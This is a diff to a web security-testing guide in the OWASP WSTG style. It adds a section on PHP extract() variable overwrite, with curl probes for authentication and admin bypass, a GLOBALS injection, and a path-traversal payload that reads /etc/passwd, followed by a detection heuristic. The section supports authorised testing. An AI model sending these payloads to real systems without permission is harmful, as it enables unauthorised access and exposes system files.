@@ -8,7 +8,7 @@ author: cyberstrike-official
 tags: [misconfiguration, hardening, server, wstg, conf]
 tech_stack: []
 cwe_ids: [CWE-16]
-chains_with: []
+chains_with: [wstg-conf-01, wstg-conf-04]
 prerequisites: []
 severity_boost: {}
 ---
@@ -265,6 +265,27 @@ nuclei -u https://target.com -t http/misconfiguration/directory-listing.yaml
 nuclei -u https://target.com -t http/exposures/configs/
 ```
 
+### PHP External Variable Modification via extract() (from PayloadsAllTheThings)
+
+If the platform is PHP and behaves unexpectedly when unrecognized query parameters are supplied (e.g. a param name matches an internal variable and changes app behavior), the app may be calling `extract($_GET)` or `extract($_POST)` — which imports every key of the array as a variable into the current scope, overwriting existing ones by default (`EXTR_OVERWRITE`):
+
+```bash
+# Probe for variable-overwrite: try setting variable names you'd expect to gate logic
+# (auth flags, role flags, admin flags, debug flags, page/include params)
+curl -s "https://{target}/vuln.php?authenticated=true"
+curl -s "https://{target}/vuln.php?authenticated=1"
+curl -s "https://{target}/vuln.php?is_admin=1"
+curl -s "https://{target}/vuln.php?debug=1"
+
+# If extract() feeds a file-inclusion path variable, this can escalate to LFI
+curl -s "https://{target}/vuln.php?page=../../../../etc/passwd"
+
+# PHP <8.1 only: extract() can also write into $GLOBALS directly
+curl -s "https://{target}/vuln.php?GLOBALS[admin]=1"
+```
+
+Detection pattern: a parameter name that matches no documented input, yet flips a response body/behavior (e.g. "Access denied" -> "Access granted"), strongly suggests unguarded `extract()` on user-controlled input. This is CWE-473/CWE-621 and commonly chains into LFI/RCE when the overwritten variable controls a file path.
+
 ### Comprehensive Config Scanner
 
 ```bash
@@ -443,6 +464,7 @@ CustomLog logs/access.log combined env=!dontlog
 
 - [OWASP WSTG - Test Application Platform Configuration](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Test_Application_Platform_Configuration)
 - [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks)
+- [PayloadsAllTheThings - External Variable Modification](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/External%20Variable%20Modification)
 
 
 ---
